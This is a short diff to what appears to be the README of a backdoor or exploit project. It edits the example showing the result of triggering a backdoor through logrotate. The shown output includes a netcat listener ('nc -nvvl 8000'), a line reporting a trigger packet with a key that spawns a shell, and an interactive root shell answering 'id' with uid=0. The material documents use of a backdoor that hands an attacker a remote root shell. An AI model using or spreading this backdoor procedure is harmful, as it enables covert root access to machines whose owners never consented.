@@ -42,9 +42,12 @@ Finally, execute this from a third commandline to trigger the logrotate:
 You should see output from the `id` command on your netcat terminal, and should be able to interact with the backdoor:
 ```
 [user]$ nc -nvvl 8000
+Received trigger packet with key=6d616769636b6579, spawning a shell...
+bash: no job control in this shell
 bash-3.2# id
 id
-uid=0(root) gid=0(wheel) groups=0(wheel) ...
+uid=0(root) gid=0(wheel) groups=0(wheel),...
+bash-3.2#
 ```
 
 ## Thanks
